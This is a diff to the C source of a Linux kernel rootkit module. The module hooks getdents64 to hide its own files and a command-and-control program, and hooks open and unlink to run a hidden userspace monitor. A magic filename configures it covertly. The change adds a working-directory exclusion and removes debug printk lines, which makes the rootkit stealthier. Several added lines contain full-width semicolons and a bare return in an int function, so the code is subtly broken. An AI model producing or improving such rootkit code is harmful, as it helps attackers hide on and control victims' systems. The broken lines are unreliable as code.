@@ -37,6 +37,7 @@ char *INEXISTFILE = "HIDEAFILEINKERNEL";
 char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
 char *monitor = NULL;
+char *workdir = NULL;
 int filenum;
 int moni_open;
 int moni_unlink;
@@ -66,13 +67,12 @@ static int lkm_init(void)
     ENABLE_WRITE_PROTECTION;
     
     hidfiles[0] = "cmdoutput.txttmp";
-    hidfiles[1] = "monitoroutput.txttmp";
-    hidfiles[2] = "myrootkit.ko";
-    hidfiles[3] = "ccprogram";
-    hidfiles[4] = "ccprogram.c";
-    hidfiles[5] = "monitor";
-    hidfiles[6] = "monitor.c";
-    
+    hidfiles[1] = "myrootkit.ko";
+    hidfiles[2] = "ccprogram";
+    hidfiles[3] = "ccprogram.c";
+    hidfiles[4] = "monitor";
+    hidfiles[5] = "monitor.c";
+    hidfiles[6] = "monitoroutput.txttmp";
     filenum=7;
     moni_open = 0;
     moni_unlink = 0;
@@ -148,7 +148,7 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
 }
 
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode){
-    if(moni_open){
+    if(moni_open && strncmp(filename, workdir, strlen(workdir)) != 0){
         callMonitor("open", filename);
     }
            
@@ -205,7 +205,6 @@ asmlinkage long hooked_unlink(const char __user *filename){
                 value[j] = '\0';
             }
             configMonitor(value);
-            printk("config=%s\n", value);
         }
     } else if(moni_unlink){
         callMonitor("unlink", filename);
@@ -227,13 +226,13 @@ static void lkm_exit(void)
 }
 
 static int callMonitor(char *type, const char *msg){
+    if(monitor == NULL) return;
+    
     char *argv[] = { monitor, type, msg, NULL};
     static char *envp[] = {
             "HOME=/",
             "TERM=linux",
             "PATH=/sbin:/bin:/usr/sbin:/usr/bin:", NULL};
-            
-    printk("type=%s, %s\n", type, msg);
 
     return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
@@ -243,7 +242,11 @@ static int configMonitor(char *msg){
     
     if(strncmp(msg, "set", 3) == 0){
         msg += 4;
-        monitor = msg;
+        workdir = (char*) vmalloc(strlen(msg) + 1);
+        memcpy(workdir, msg, strlen(msg) + 1)；
+        monitor = (char*) vmalloc(strlen(msg) + 20);
+        memcpy(monitor, msg, strlen(msg) + 1)；
+        strcat(monitor, "/./monitor")；
     } else if(strncmp(msg, "open", 4) == 0){
         moni_open = 1;
     } else if(strncmp(msg, "unlink", 6) == 0){
